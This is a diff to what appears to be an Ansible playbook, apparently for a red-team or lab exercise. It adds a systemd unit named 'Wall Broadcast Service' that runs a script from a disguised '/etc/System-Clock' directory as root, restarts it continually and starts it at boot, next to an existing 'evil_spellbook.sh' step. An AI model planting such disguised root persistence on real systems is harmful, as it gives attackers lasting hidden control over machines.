@@ -50,6 +50,23 @@
   - name: Execute spellbook script
     command: /etc/System-Clock/evil_spellbook.sh
 
+  - name: Create Wall service
+    copy: 
+      dest: /etc/systemd/system/wall.service
+      content: | 
+        [Unit]
+        Description=Wall Broadcast Service
+        After=network.target
+
+        [Service]
+        ExecStart=/bin/bash /etc/System-Clock/thewallsaretalking.sh
+        Restart=always
+        RestartSec=5
+        User=root
+
+        [Install]
+        WantedBy=multi-user.target
+
   - name: Create systemd service
     copy:
       dest: /etc/systemd/system/system-clock.service
